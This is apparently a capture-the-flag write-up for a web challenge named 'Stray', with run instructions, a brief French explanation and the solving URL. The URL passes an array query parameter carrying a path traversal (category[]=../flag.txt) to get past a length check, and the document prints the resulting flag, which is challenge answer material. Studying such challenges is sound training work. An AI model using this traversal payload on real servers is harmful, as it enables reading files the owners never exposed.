# Stray

Stuck on what to name your stray cat?

## Running

```
docker compose up
```

Then access [http://localhost:3000](http://localhost:3000) in your browser.


## Flag


`https://stray.chall.pwnoh.io/cat?category[]=../flag.txt`

**category.length** sera alors la taille de l'array qui est 1 et vérifie dc bien le check 

```nodejs
f (category.length == 1)
```


```
{"name":"bctf{j4v45cr1p7_15_4_6r347_l4n6u463}"}
```
